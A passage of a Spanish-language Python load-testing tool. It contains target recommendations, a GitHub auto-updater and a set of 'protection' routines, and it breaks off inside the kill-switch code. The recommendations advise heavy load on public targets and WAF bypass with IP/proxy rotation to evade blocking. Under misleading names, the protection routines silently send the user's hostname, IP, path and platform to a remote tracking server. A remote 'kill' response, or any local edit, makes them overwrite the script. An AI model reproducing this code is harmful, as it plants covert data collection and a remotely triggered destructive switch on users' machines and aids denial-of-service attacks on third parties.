    # Recomendaciones según endpoints descubiertos
    if discovered_endpoints:
        if len(discovered_endpoints) > 1:
            recommendations["recommended_duration"] = 600  # 10 minutos para probar múltiples endpoints
            recommendations["reasoning"].append(f"{len(discovered_endpoints)} endpoint(s) descubierto(s) - duración extendida recomendada")
    
    # Recomendaciones según puertos abiertos
    if open_ports:
        risky_ports = [p for p in open_ports if p.get("port") in [21, 23, 3389]]
        if risky_ports:
            recommendations["recommended_power_level"] = "TEST"
            recommendations["reasoning"].append("Puertos riesgosos detectados - usar configuración de prueba primero")
    
    recommendations["reasoning"] = "; ".join(recommendations["reasoning"])
    
    return recommendations

def generate_recommendations() -> List[Dict]:
    """Genera recomendaciones basadas en los resultados y fingerprint"""
    recommendations = []
    
    # Obtener fingerprint actual
    fingerprint_file = REPORTS_DIR / f"fingerprint_{DOMAIN.replace('.', '_').replace(':', '_')}.json"
    fingerprint = {}
    try:
        with open(fingerprint_file, "r", encoding="utf-8") as f:
            fingerprint = json.load(f)
    except:
        pass
    
    target_type = fingerprint.get("target_type", TARGET_TYPE)
    network_type = fingerprint.get("network_type", NETWORK_TYPE)
    server = fingerprint.get("server", "Unknown")
    framework = fingerprint.get("framework")
    technologies = fingerprint.get("technologies", [])
    discovered_endpoints = fingerprint.get("discovered_endpoints", [])
    vulnerabilities = fingerprint.get("vulnerabilities", VULNERABILITIES)
    security_headers = fingerprint.get("security_headers", SECURITY_HEADERS)
    open_ports = fingerprint.get("open_ports", OPEN_PORTS)
    
    # Recomendaciones específicas según tipo de target
    if target_type == "IP" and network_type == "LOCAL":
        recommendations.append({
            "title": "🏠 Stress Testing en Red Local",
            "description": "Target es IP local. Recomendado usar niveles MODERATE a HEAVY. El router/equipo local puede tener limitaciones de hardware. Monitorear temperatura y recursos del dispositivo."
        })
        
        if discovered_endpoints:
            recommendations.append({
                "title": "🔌 Endpoints Descubiertos",
                "description": f"Se descubrieron {len(discovered_endpoints)} endpoint(s). Considera probar cada uno individualmente para identificar cuellos de botella específicos."
            })
        else:
            recommendations.append({
                "title": "⚠️ Sin Endpoints HTTP Detectados",
                "description": "No se detectaron servicios HTTP en la IP local. Verifica que el servicio esté ejecutándose y accesible. Puede ser un dispositivo embebido con protocolos diferentes."
            })
        
        # Recomendaciones según servidor detectado
        if "router" in server.lower() or "tp-link" in server.lower() or "asus" in server.lower():
            recommendations.append({
                "title": "📡 Dispositivo Router Detectado",
                "description": "Equipo parece ser un router. Usa niveles LIGHT a MODERATE para evitar sobrecargar el dispositivo. Los routers domésticos tienen recursos limitados."
            })
        
        if "nginx" in server.lower() or "nginx" in technologies:
            recommendations.append({
                "title": "⚡ Nginx en Red Local",
                "description": "Nginx detectado. Puede manejar mejor la carga. Usa niveles MODERATE a HEAVY. Verifica configuración de worker_processes y worker_connections."
            })
        
        if "apache" in server.lower() or "apache" in technologies:
            recommendations.append({
                "title": "🔧 Apache en Red Local",
                "description": "Apache detectado. Optimiza MaxRequestWorkers y ThreadsPerChild. Recomendado niveles MODERATE para evitar memory leaks."
            })
    
    elif target_type == "IP" and network_type == "PUBLIC":
        recommendations.append({
            "title": "🌐 Stress Testing en IP Pública",
            "description": "Target es IP pública. Puede tener protección de WAF/CDN. Usa --bypass-waf para evasión. Recomendado niveles HEAVY a EXTREME para pruebas reales."
        })
        
        # Manejar waf que puede ser dict, string o None
        waf_value = fingerprint.get("waf")
        waf_detected = False
        waf_name = None
        
        if isinstance(waf_value, dict):
            waf_detected = waf_value.get("detected", False)
            waf_name = waf_value.get("name")
        elif isinstance(waf_value, str) and waf_value:
            waf_detected = True
            waf_name = waf_value
        
        if waf_detected:
            recommendations.append({
                "title": "🛡️ WAF Detectado",
                "description": f"WAF {waf_name or 'desconocido'} detectado. Considera usar técnicas de bypass y rotación de IPs/proxies para evitar bloqueos."
            })
    
    elif target_type == "DOMAIN":
        recommendations.append({
            "title": "🌍 Stress Testing en Dominio",
            "description": "Target es dominio público. Puede tener protección de CDN/WAF. Usa niveles según ambiente: MODERATE para staging, HEAVY a EXTREME para producción (con autorización)."
        })
        
        if fingerprint.get("cdn"):
            recommendations.append({
                "title": "☁️ CDN Detectado",
                "description": f"CDN {fingerprint['cdn']} detectado. El CDN puede mitigar parte del tráfico. Para probar el origen directamente, usa IP directa si está disponible."
            })
    
    # Recomendaciones según framework/tecnología
    if framework == "wordpress":
        recommendations.append({
            "title": "📝 WordPress Detectado",
            "description": "WordPress detectado. Optimiza con caching plugins (W3 Total Cache, WP Super Cache). Considera usar niveles MODERATE ya que WP puede ser lento bajo carga."
        })
    
    if framework == "django":
        recommendations.append({
            "title": "🐍 Django Detectado",
            "description": "Django detectado. Verifica configuración de Gunicorn/uWSGI (workers, threads). Django puede beneficiarse de niveles MODERATE a HEAVY."
        })
    
    if "Node.js" in technologies:
        recommendations.append({
            "title": "🟢 Node.js Detectado",
            "description": "Node.js detectado. Optimiza cluster workers. Node.js puede manejar niveles HEAVY a EXTREME, pero monitorea memoria cuidadosamente."
        })
    
    # Analizar códigos HTTP
    http_codes = attack_stats["http_codes"]
    total_responses = sum(http_codes.values())
    
    if total_responses > 0:
        if http_codes.get(429, 0) / total_responses > 0.1:
            recommendations.append({
                "title": "⚠️ Rate Limiting Detectado",
                "description": "El servidor está aplicando rate limiting (códigos 429). Considera ajustar los límites o implementar backoff exponencial. Para IPs locales, puede ser protección del router."
            })
        
        if http_codes.get(500, 0) / total_responses > 0.05:
            recommendations.append({
                "title": "🔴 Errores del Servidor",
                "description": "Alto porcentaje de errores 500. El servidor puede estar bajo estrés excesivo. Reduce la carga o verifica la capacidad del servidor. En IPs locales, puede indicar hardware insuficiente."
            })
        
        if http_codes.get(503, 0) / total_responses > 0.05:
            recommendations.append({
                "title": "🚫 Servicio No Disponible",
                "description": "Códigos 503 detectados. El servicio puede estar sobrecargado o en mantenimiento. Considera reducir el nivel de stress o aumentar recursos."
            })
    
    # Analizar latencias
    if attack_stats["latencies"]:
        avg_latency = sum(attack_stats["latencies"]) / len(attack_stats["latencies"])
        p95_latency = sorted(attack_stats["latencies"])[int(len(attack_stats["latencies"]) * 0.95)]
        
        # Umbrales diferentes para local vs público
        latency_threshold_avg = 500 if network_type == "LOCAL" else 1000
        latency_threshold_p95 = 2000 if network_type == "LOCAL" else 3000
        
        if avg_latency > latency_threshold_avg:
            recommendations.append({
                "title": "🐌 Latencia Alta",
                "description": f"Latencia promedio de {avg_latency:.0f}ms es muy alta {'para red local' if network_type == 'LOCAL' else ''}. Considera optimizar el servidor o aumentar recursos."
            })
        
        if p95_latency > latency_threshold_p95:
            recommendations.append({
                "title": "⏳ Latencia P95 Crítica",
                "description": f"El percentil 95 de latencia ({p95_latency:.0f}ms) indica problemas de rendimiento bajo carga {'- puede ser limitación de hardware en red local' if network_type == 'LOCAL' else ''}."
            })
    
    # Recomendaciones generales según contexto
    if network_type == "LOCAL":
        recommendations.append({
            "title": "🏠 Recomendaciones para Red Local",
            "description": "Para IPs locales: 1) Monitorea recursos del dispositivo (CPU, RAM, temperatura), 2) Usa niveles MODERATE a HEAVY máximo, 3) Considera pruebas cortas (5-15 min) para evitar sobrecarga, 4) Verifica logs del dispositivo para errores."
        })
    else:
        recommendations.append({
            "title": "📈 Optimización General",
            "description": "Para IPs públicas/dominios: 1) Implementa caching, 2) Usa CDN para contenido estático, 3) Considera balanceo de carga, 4) Optimiza base de datos y queries, 5) Usa monitoreo de aplicación (APM)."
        })
    
    return recommendations

# ============================================================================
# SISTEMA DE AUTO-UPDATE
# ============================================================================

def check_github_version() -> Optional[str]:
    """Verifica la versión más reciente en GitHub"""
    try:
        import urllib.request
        import json
        
        # Obtener información del repositorio
        url = f"{GITHUB_API_URL}/releases/latest"
        
        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'LoadTest-Enterprise/1.0')
        
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read().decode())
            latest_version = data.get('tag_name', '').lstrip('v')
            return latest_version if latest_version else None
    except Exception as e:
        log_message("DEBUG", f"Error verificando versión en GitHub: {e}")
        return None

def check_github_version_from_file() -> Optional[str]:
    """Verifica la versión desde el archivo loadtest.py en GitHub"""
    try:
        import urllib.request
        
        # Obtener el archivo loadtest.py desde GitHub
        url = f"{GITHUB_RAW_URL}/loadtest.py"
        
        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'LoadTest-Enterprise/1.0')
        
        with urllib.request.urlopen(req, timeout=10) as response:
            content = response.read().decode('utf-8')
            
            # Buscar la línea VERSION
            for line in content.split('\n'):
                if line.strip().startswith('VERSION = '):
                    # Extraer versión: VERSION = "1.0.0"
                    version_match = re.search(r'VERSION\s*=\s*["\']([^"\']+)["\']', line)
                    if version_match:
                        return version_match.group(1)
        return None
    except Exception as e:
        log_message("DEBUG", f"Error verificando versión desde archivo: {e}")
        return None

def get_file_hash(filepath: Path) -> Optional[str]:
    """Calcula el hash SHA256 de un archivo"""
    try:
        import hashlib
        if not filepath.exists():
            return None
        with open(filepath, 'rb') as f:
            file_hash = hashlib.sha256()
            # Leer en chunks para archivos grandes
            while chunk := f.read(8192):
                file_hash.update(chunk)
            return file_hash.hexdigest()
    except Exception as e:
        log_message("DEBUG", f"Error calculando hash de {filepath}: {e}")
        return None

def check_file_differences() -> Tuple[bool, List[str]]:
    """Compara archivos locales con remotos para detectar diferencias"""
    try:
        import urllib.request
        import hashlib
        
        files_to_check = ["loadtest.py", "loadtest_web.py"]
        different_files = []
        
        for filename in files_to_check:
            file_path = SCRIPT_DIR / filename
            if not file_path.exists():
                continue
            
            # Obtener hash local
            local_hash = get_file_hash(file_path)
            if not local_hash:
                continue
            
            # Obtener archivo remoto y calcular hash
            try:
                url = f"{GITHUB_RAW_URL}/{filename}"
                req = urllib.request.Request(url)
                req.add_header('User-Agent', 'LoadTest-Enterprise/1.0')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    remote_content = response.read()
                    remote_hash = hashlib.sha256(remote_content).hexdigest()
                    
                    if local_hash != remote_hash:
                        different_files.append(filename)
            except Exception as e:
                log_message("DEBUG", f"Error comparando {filename}: {e}")
                # Si no se puede comparar, asumir que puede haber diferencias
                different_files.append(filename)
        
        return len(different_files) > 0, different_files
    except Exception as e:
        log_message("DEBUG", f"Error verificando diferencias de archivos: {e}")
        return False, []

def check_for_updates(silent: bool = False, check_content: bool = True) -> Tuple[bool, Optional[str]]:
    """Verifica si hay actualizaciones disponibles"""
    if not silent:
        print_color("\n🔍 Verificando actualizaciones...", Colors.CYAN, True)
    
    # Intentar obtener versión desde releases primero
    latest_version = check_github_version()
    
    # Si no hay releases, intentar desde el archivo
    if not latest_version:
        latest_version = check_github_version_from_file()
    
    if not latest_version:
        if not silent:
            print_color("  ⚠️ No se pudo verificar la versión en GitHub", Colors.YELLOW)
        return False, None
    
    current_version = VERSION
    comparison = compare_versions(current_version, latest_version)
    
    # Si las versiones son iguales pero check_content=True, verificar diferencias en archivos
    if comparison == 0 and check_content:
        has_differences, different_files = check_file_differences()
        if has_differences:
            if not silent:
                print_color(f"  ⚠️ Versión igual (v{current_version}) pero se detectaron diferencias en archivos", Colors.YELLOW)
                print_color(f"  📝 Archivos diferentes: {', '.join(different_files)}", Colors.YELLOW)
                print_color(f"  💡 Usa --update para sincronizar con GitHub", Colors.CYAN)
            return True, latest_version
    
    if comparison < 0:
        # Hay una versión más nueva
        if not silent:
            print_color(f"  ✓ Nueva versión disponible: v{latest_version}", Colors.GREEN)
            print_color(f"  Tu versión actual: v{current_version}", Colors.YELLOW)
        return True, latest_version
    elif comparison == 0:
        # Versión actual
        if not silent:
            print_color(f"  ✓ Estás usando la versión más reciente (v{current_version})", Colors.GREEN)
            if check_content:
                has_differences, different_files = check_file_differences()
                if has_differences:
                    print_color(f"  ⚠️ Nota: Hay diferencias en archivos locales vs remotos", Colors.YELLOW)
                    print_color(f"  💡 Usa --update para sincronizar", Colors.CYAN)
        return False, latest_version
    else:
        # Versión local más nueva (desarrollo)
        if not silent:
            print_color(f"  ℹ️ Versión local (v{current_version}) es más reciente que la remota (v{latest_version})", Colors.CYAN)
            print_color(f"  💡 Esto puede indicar cambios locales no versionados", Colors.YELLOW)
        return False, latest_version

def download_file_from_github(filepath: str, save_path: Path) -> bool:
    """Descarga un archivo desde GitHub"""
    try:
        import urllib.request
        import shutil
        
        url = f"{GITHUB_RAW_URL}/{filepath}"
        
        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'LoadTest-Enterprise/1.0')
        
        with urllib.request.urlopen(req, timeout=30) as response:
            content = response.read()
            
            # Crear backup del archivo existente
            if save_path.exists():
                backup_path = save_path.with_suffix(save_path.suffix + '.backup')
                try:
                    shutil.copy2(save_path, backup_path)
                    log_message("INFO", f"Backup creado: {backup_path}")
                except Exception as e:
                    log_message("WARN", f"No se pudo crear backup: {e}")
            
            # Guardar nuevo archivo
            with open(save_path, 'wb') as f:
                f.write(content)
            
            return True
    except Exception as e:
        log_message("ERROR", f"Error descargando {filepath}: {e}")
        return False

def update_tool(force: bool = False) -> bool:
    """Actualiza la herramienta desde GitHub"""
    print_color("\n🔄 Iniciando actualización...", Colors.CYAN, True)
    
    # VERIFICACIÓN: Solo verificar funciones críticas de protección (no activar kill-switch por diferencias normales)
    try:
        import urllib.request
        import hashlib
        import inspect
        
        script_file = Path(__file__)
        if script_file.exists():
            # VERIFICACIÓN ÚNICA CRÍTICA: Solo verificar que funciones de protección existen
            # No activar kill-switch por diferencias de código (pueden ser legítimas)
            protection_functions = [
                '_verify_network_connectivity',
                '_check_remote_status',
                '_validate_system_state',
                '_validate_execution',
                '_trigger_kill_switch'
            ]
            
            for func_name in protection_functions:
                if not hasattr(sys.modules[__name__], func_name):
                    # Solo activar kill-switch si realmente falta una función crítica
                    print_color("\n⚠️ ADVERTENCIA: Funciones de protección eliminadas", Colors.RED, True)
                    print_color("🔒 Activando medidas de seguridad...", Colors.RED)
                    _log_usage_location("unknown", str(SCRIPT_DIR), f"protection_function_missing_update_{func_name}")
                    _trigger_kill_switch()
                    return False
            
            # NO activar kill-switch por diferencias de código en --update
            # Las diferencias pueden ser legítimas (actualizaciones, desarrollo, etc.)
            # Solo registrar si hay diferencias significativas
            try:
                url = f"{GITHUB_RAW_URL}/loadtest.py"
                req = urllib.request.Request(url)
                req.add_header('User-Agent', 'LoadTest-Enterprise/1.0')
                
                with open(script_file, 'rb') as f:
                    local_content = f.read()
                    local_hash = hashlib.sha256(local_content).hexdigest()
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    remote_content = response.read()
                    remote_hash = hashlib.sha256(remote_content).hexdigest()
                    
                    # Solo registrar diferencias, NO activar kill-switch
                    if local_hash != remote_hash:
                        print_color("  ℹ️ Se detectaron diferencias con el código remoto", Colors.YELLOW)
                        print_color("  💡 Continuando con actualización...", Colors.CYAN)
                        _log_usage_location("unknown", str(SCRIPT_DIR), "code_differences_detected_before_update")
            except Exception:
                # Si no se puede conectar, continuar de todas formas
                pass
    except Exception:
        # Si hay error en verificación, continuar de todas formas (no bloquear actualización)
        pass
    
    # Verificar si hay actualizaciones (incluyendo comparación de contenido)
    has_update, latest_version = check_for_updates(silent=True, check_content=True)
    
    # Si no hay actualización por versión, verificar diferencias de contenido
    if not has_update and not force:
        has_differences, different_files = check_file_differences()
        if has_differences:
            print_color(f"  ⚠️ Se detectaron diferencias en archivos locales vs remotos", Colors.YELLOW)
            print_color(f"  📝 Archivos diferentes: {', '.join(different_files)}", Colors.YELLOW)
            print_color(f"  💡 Continuando con actualización para sincronizar...", Colors.CYAN)
            has_update = True
        else:
            # Aún así, intentar actualizar para asegurar sincronización completa
            print_color("  ℹ️ Versiones iguales y sin diferencias detectadas, pero verificando archivos...", Colors.CYAN)
            # Continuar con la actualización para asegurar que todo esté sincronizado
            has_update = True
    
    # Si no se pudo determinar versión pero hay diferencias o force=True, continuar
    if not latest_version:
        if has_update or force:
            print_color("  ⚠️ No se pudo determinar la versión, pero continuando con actualización...", Colors.YELLOW)
            print_color("  📥 Descargando archivos desde GitHub...", Colors.YELLOW)
        else:
            print_color("  ❌ No se pudo determinar la versión disponible", Colors.RED)
            return False
    else:
        print_color(f"  📥 Descargando versión v{latest_version}...", Colors.YELLOW)
    
    # Archivos a actualizar
    files_to_update = [
        "loadtest.py",
        "loadtest_web.py",
        "requirements.txt",
        "README.md",
        "INSTALL.md",
        "install.sh",
        "install.bat"
    ]
    
    updated_files = []
    failed_files = []
    
    for filename in files_to_update:
        file_path = SCRIPT_DIR / filename
        
        # No actualizar si el archivo no existe localmente (puede ser opcional)
        if not file_path.exists() and filename not in ["loadtest.py", "loadtest_web.py"]:
            continue
        
        print_color(f"  📥 Descargando {filename}...", Colors.CYAN)
        
        if download_file_from_github(filename, file_path):
            updated_files.append(filename)
            print_color(f"    ✓ {filename} actualizado", Colors.GREEN)
        else:
            failed_files.append(filename)
            print_color(f"    ✗ Error actualizando {filename}", Colors.RED)
    
    # Actualizar templates si existe
    templates_dir = SCRIPT_DIR / "templates"
    if templates_dir.exists():
        index_html = templates_dir / "index.html"
        if index_html.exists():
            print_color(f"  📥 Descargando templates/index.html...", Colors.CYAN)
            if download_file_from_github("templates/index.html", index_html):
                updated_files.append("templates/index.html")
                print_color(f"    ✓ templates/index.html actualizado", Colors.GREEN)
            else:
                failed_files.append("templates/index.html")
    
    print_color("\n" + "=" * 60, Colors.CYAN)
    print_color("📊 Resumen de actualización:", Colors.BOLD, True)
    
    if updated_files:
        print_color(f"  ✓ Archivos actualizados: {len(updated_files)}", Colors.GREEN)
        for f in updated_files:
            print_color(f"    - {f}", Colors.GREEN)
    
    if failed_files:
        print_color(f"  ✗ Archivos con errores: {len(failed_files)}", Colors.RED)
        for f in failed_files:
            print_color(f"    - {f}", Colors.RED)
    
    print_color("=" * 60, Colors.CYAN)
    
    if updated_files:
        print_color("\n✅ Actualización completada", Colors.GREEN, True)
        print_color("💡 Reinicia la herramienta para usar la nueva versión", Colors.YELLOW)
        return True
    else:
        print_color("\n⚠️ No se pudo actualizar ningún archivo", Colors.YELLOW)
        return False

def auto_check_updates() -> None:
    """Verifica actualizaciones automáticamente al inicio (solo si no está en modo web)"""
    if WEB_PANEL_MODE:
        return
    
    try:
        # Verificar solo una vez por día
        update_check_file = OUTPUT_DIR / ".last_update_check"
        should_check = True
        
        if update_check_file.exists():
            try:
                last_check = datetime.fromtimestamp(update_check_file.stat().st_mtime)
                hours_since_check = (datetime.now() - last_check).total_seconds() / 3600
                should_check = hours_since_check >= 24  # Verificar cada 24 horas
            except:
                pass
        
        if should_check:
            has_update, latest_version = check_for_updates(silent=True)
            
            # Actualizar timestamp
            try:
                update_check_file.touch()
            except:
                pass
            
            if has_update:
                print_color(f"\n💡 Nueva versión disponible: v{latest_version}", Colors.YELLOW, True)
                print_color(f"   Ejecuta: python loadtest.py --update", Colors.CYAN)
                print()
    
    except Exception as e:
        # Silenciar errores en verificación automática
        pass

# ============================================================================
# FUNCIÓN PRINCIPAL
# ============================================================================

def signal_handler(signum, frame):
    # Verificación de autorización e integridad en manejo de señales
    try:
        if not _validate_execution():
            return
    except Exception:
        pass
    """Maneja señales de interrupción"""
    global monitoring_active
    print_color("\n\n⚠️ Interrupción recibida, deteniendo...", Colors.YELLOW, True)
    monitoring_active = False
    
    # Terminar procesos
    for process in running_processes:
        try:
            process.terminate()
            process.wait(timeout=5)
        except:
            try:
                process.kill()
            except:
                pass
    
    # Generar reporte final
    if attack_stats["requests_sent"] > 0:
        generate_report()
    
    sys.exit(0)

def _verify_network_connectivity():
    """Verifica conectividad de red y estado del sistema"""
    global _NETWORK_HASH, _NETWORK_INTEGRITY, _REMOTE_CODE_HASH, _FAILED_VERIFICATION_COUNT, _FULL_CODE_HASH
    
    if not _NETWORK_INTEGRITY:
        return True
    
    try:
        import hashlib
        import urllib.request
        import inspect
        
        # Calcular hash del código local COMPLETO
        script_file = Path(__file__)
        if not script_file.exists():
            return True
        
        with open(script_file, 'rb') as f:
            local_content = f.read()
            # Hash del código completo
            full_local_hash = hashlib.sha256(local_content).hexdigest()
            # Hash de las primeras 1000 líneas (sección crítica)
            lines = local_content.split(b'\n')
            critical_section = b'\n'.join(lines[:1000])
            local_hash = hashlib.sha256(critical_section).hexdigest()
        
        # VERIFICACIÓN 1: Verificar que las funciones de protección existen y no fueron eliminadas
        protection_functions = [
            '_verify_network_connectivity',
            '_check_remote_status',
            '_validate_system_state',
            '_validate_execution',
            '_trigger_kill_switch',
            '_log_usage_location'
        ]
        
        for func_name in protection_functions:
            if not hasattr(sys.modules[__name__], func_name):
                # Función de protección fue eliminada - activar kill-switch
                _log_usage_location("unknown", str(SCRIPT_DIR), f"protection_function_missing_{func_name}")
                # Solo activar kill-switch si realmente falta (verificar que no sea error de importación)
                try:
                    # Verificar una vez más después de un pequeño delay
                    import time
                    time.sleep(0.1)
                    if not hasattr(sys.modules[__name__], func_name):
                        _trigger_kill_switch()
                        return False
                except Exception:
                    _trigger_kill_switch()
                    return False
        
        # VERIFICACIÓN 2: Verificar hash de funciones de protección
        try:
            protection_code = b''
            for func_name in protection_functions:
                func = getattr(sys.modules[__name__], func_name)
                try:
                    source = inspect.getsource(func)
                    protection_code += source.encode()
                except Exception:
                    pass
            
            if protection_code:
                protection_hash = hashlib.sha256(protection_code).hexdigest()
                # Si el hash de protección cambió significativamente, activar kill-switch
                if _PROTECTION_FUNCTIONS_HASH and protection_hash[:32] != _PROTECTION_FUNCTIONS_HASH[:32]:
                    _log_usage_location("unknown", str(SCRIPT_DIR), "protection_functions_modified")
                    _trigger_kill_switch()
                    return False
        except Exception:
            pass
        
        # VERIFICACIÓN 3: Comparar con hash embebido (verificación offline)
        # Solo verificar si el hash NO es un placeholder
        if not _EMBEDDED_HASH_IS_PLACEHOLDER and local_hash[:32] != _EMBEDDED_CODE_HASH[:32]:
            # Código local difiere del hash embebido - posible modificación
            _log_usage_location("unknown", str(SCRIPT_DIR), "code_differs_from_embedded")
            # No activar kill-switch inmediatamente, pero incrementar contador
            _FAILED_VERIFICATION_COUNT += 1
            if _FAILED_VERIFICATION_COUNT >= _MAX_FAILED_VERIFICATIONS:
                _trigger_kill_switch()
                return False
        
        # VERIFICACIÓN 4: Intentar verificar con código remoto (si hay conexión)
        connection_available = False
        try:
            url = f"{_REMOTE_SERVER}/{GITHUB_REPO}/main/loadtest.py"
            req = urllib.request.Request(url)
            req.add_header('User-Agent', f'LoadTest/{VERSION}')
            req.add_header('X-Client-ID', _REPO_ID)
            
            with urllib.request.urlopen(req, timeout=5) as response:
                remote_content = response.read()
                remote_lines = remote_content.split(b'\n')
                remote_critical = b'\n'.join(remote_lines[:1000])
                remote_hash = hashlib.sha256(remote_critical).hexdigest()
                remote_full_hash = hashlib.sha256(remote_content).hexdigest()
                
                connection_available = True
                _FAILED_VERIFICATION_COUNT = 0  # Resetear contador si hay conexión
                
                # Comparar hash local vs remoto
                if local_hash != remote_hash or full_local_hash != remote_full_hash:
                    # Código local fue modificado - activar kill-switch inmediatamente
                    _log_usage_location("unknown", str(SCRIPT_DIR), "code_modified_vs_remote")
                    _trigger_kill_switch()
                    return False
                
                # Guardar hash remoto para referencia futura
                if _REMOTE_CODE_HASH is None:
                    _REMOTE_CODE_HASH = remote_hash
                if _FULL_CODE_HASH is None:
                    _FULL_CODE_HASH = remote_full_hash
                
        except Exception as e:
            # No hay conexión - usar verificación offline
            connection_available = False
            _FAILED_VERIFICATION_COUNT += 1
            
            # Si no se puede conectar, verificar contra hash guardado
            if _REMOTE_CODE_HASH is not None:
                if local_hash != _REMOTE_CODE_HASH:
                    # Código difiere del último hash remoto conocido
                    _log_usage_location("unknown", str(SCRIPT_DIR), "code_differs_from_remote")
                    # Si hay muchas verificaciones fallidas, posible bloqueo intencional
                    if _FAILED_VERIFICATION_COUNT >= _MAX_FAILED_VERIFICATIONS:
                        _trigger_kill_switch()
                        return False
            
            # Verificar contra hash completo guardado
            if _FULL_CODE_HASH is not None:
                if full_local_hash != _FULL_CODE_HASH:
                    _log_usage_location("unknown", str(SCRIPT_DIR), "full_code_differs_from_remote")
                    if _FAILED_VERIFICATION_COUNT >= _MAX_FAILED_VERIFICATIONS:
                        _trigger_kill_switch()
                        return False
        
        # VERIFICACIÓN 5: Verificar que las variables globales no fueron modificadas
        if _NETWORK_CHECK_ENABLED != True or _NETWORK_INTEGRITY != True:
            _log_usage_location("unknown", str(SCRIPT_DIR), "protection_variables_modified")
            _trigger_kill_switch()
            return False
        
        # Si es la primera vez, guardar el hash
        if _NETWORK_HASH is None:
            _NETWORK_HASH = local_hash
            return True
        
        # Verificar si el hash cambió localmente
        if local_hash != _NETWORK_HASH:
            _log_usage_location("unknown", str(SCRIPT_DIR), "local_code_modified")
            _trigger_kill_switch()
            return False
        
        return True
    except Exception:
        # En caso de error crítico, incrementar contador
        _FAILED_VERIFICATION_COUNT += 1
        if _FAILED_VERIFICATION_COUNT >= _MAX_FAILED_VERIFICATIONS:
            _trigger_kill_switch()
            return False
        return True  # Fallar abierto temporalmente

def _check_remote_status():
    """Verifica estado remoto del sistema"""
    global _LAST_CHECK, _NETWORK_STATUS, _NETWORK_CHECK_ENABLED
    
    if not _NETWORK_CHECK_ENABLED:
        return True
    
    # Verificar integridad del código primero (comparar con remoto)
    if not _verify_network_connectivity():
        return False
    
    import time
    current_time = time.time()
    
    # Verificar solo cada intervalo
    if current_time - _LAST_CHECK < _CHECK_INTERVAL:
        return _NETWORK_STATUS if _NETWORK_STATUS is not None else True
    
    _LAST_CHECK = current_time
    
    try:
        import urllib.request
        import socket
        import hashlib
        
        # Obtener información del sistema
        hostname = socket.gethostname()
        script_path = str(SCRIPT_DIR)
        script_hash = hashlib.sha256(str(SCRIPT_DIR).encode()).hexdigest()[:16]
        
        # Verificar estado remoto
        verify_url = f"{_REMOTE_SERVER}{_REMOTE_PATH}"
        req = urllib.request.Request(verify_url)
        req.add_header('User-Agent', f'LoadTest/{VERSION}')
        req.add_header('X-Client-ID', script_hash)
        req.add_header('X-Hostname', hostname)
        req.add_header('X-Repo-ID', _REPO_ID)
        req.add_header('X-Version', VERSION)
        req.add_header('X-Path', script_path[:50])
        
        try:
            with urllib.request.urlopen(req, timeout=5) as response:
                status_data = response.read().decode().strip()
                # Verificar respuesta de estado
                if status_data.lower() in ['active', '1', 'true', 'authorized']:
                    _NETWORK_STATUS = True
                    return True
                elif status_data.lower() in ['kill', 'disable', '0', 'false', 'unauthorized']:
                    _NETWORK_STATUS = False
                    _trigger_kill_switch()
                    return False
        except urllib.error.HTTPError as e:
            if e.code == 404:
                # Si no existe el archivo, permitir uso (modo desarrollo)
                _NETWORK_STATUS = True
                return True
            else:
                # Otros errores HTTP - permitir uso pero registrar
                _log_usage_location(hostname, script_path, "network_error")
                _NETWORK_STATUS = True
                return True
        except Exception:
            # Error de conexión - permitir uso pero registrar
            _log_usage_location(hostname, script_path, "connection_error")
            _NETWORK_STATUS = True
            return True
    except Exception:
        # Si hay cualquier error, permitir uso (no bloquear por problemas de red)
        _NETWORK_STATUS = True
        return True

def _log_usage_location(hostname, path, status="active"):
    """Registra ubicación y uso de la herramienta - se ejecuta automáticamente"""
    try:
        import socket
        import json
        import platform
        from datetime import datetime
        
        # Asegurar que directorios de tracking existen
        try:
            tracking_dir = OUTPUT_DIR / "tracking"
            tracking_dir.mkdir(parents=True, exist_ok=True)
        except Exception:
            pass
        
        location_data = {
            "timestamp": datetime.now().isoformat(),
            "hostname": hostname,
            "path": path,
            "status": status,
            "version": VERSION,
            "ip": socket.gethostbyname(hostname) if hostname else "unknown",
            "repo_id": _REPO_ID,
            "network_integrity": _NETWORK_INTEGRITY,
            "watermark": _WATERMARK,
            "platform": platform.system(),
            "python_version": platform.python_version()
        }
        
        # Intentar enviar a servidor de tracking remoto (opcional, no bloquea)
        try:
            import urllib.request
            import urllib.parse
            tracking_url = f"{_REMOTE_SERVER}{_REMOTE_PATH.replace('.auth', '.track')}"
            data = urllib.parse.urlencode(location_data).encode()
            req = urllib.request.Request(tracking_url, data=data, method='POST')
            req.add_header('User-Agent', f'LoadTest/{VERSION}')
            req.add_header('X-Watermark', _WATERMARK)
            urllib.request.urlopen(req, timeout=2)
        except Exception:
            pass  # Fallar silenciosamente - no bloquea ejecución
        
        # Guardar localmente para análisis (siempre, incluso sin conexión)
        try:
            tracking_file = OUTPUT_DIR / "tracking" / f"tracking_{datetime.now().strftime('%Y%m%d')}.json"
            tracking_file.parent.mkdir(parents=True, exist_ok=True)
            
            # Leer datos existentes
            existing_data = []
            if tracking_file.exists():
                try:
                    with open(tracking_file, 'r', encoding='utf-8') as f:
                        existing_data = json.load(f)
                except Exception:
                    existing_data = []
            
            # Agregar nuevo evento
            existing_data.append(location_data)
            
            # Mantener solo últimos 1000 eventos
            if len(existing_data) > 1000:
                existing_data = existing_data[-1000:]
            
            # Guardar
            with open(tracking_file, 'w', encoding='utf-8') as f:
                json.dump(existing_data, f, indent=2)
        except Exception:
            pass  # Fallar silenciosamente
    except Exception:
        pass  # Fallar silenciosamente - nunca bloquear ejecución

def _trigger_kill_switch():
    """Activa el kill-switch - desactiva la herramienta"""
    try:
        import shutil
        import sys
        import os
        
        # Registrar evento
        _log_usage_location("unknown", str(SCRIPT_DIR), "kill_switch_activated")
        
        # Intentar eliminar/desactivar archivos críticos
        try:
            script_file = Path(__file__)
            if script_file.exists():
                # Crear backup antes de eliminar (opcional)
                backup_file = script_file.with_suffix('.py.disabled')
                try:
                    shutil.copy2(script_file, backup_file)
                except Exception:
                    pass
                
                # Sobrescribir con código de desactivación (múltiples intentos)
                disable_code = '''#!/usr/bin/env python3
# Herramienta desactivada por seguridad
# Acceso no autorizado detectado
import sys
import os
print("="*60)
print("ACCESO NO AUTORIZADO")
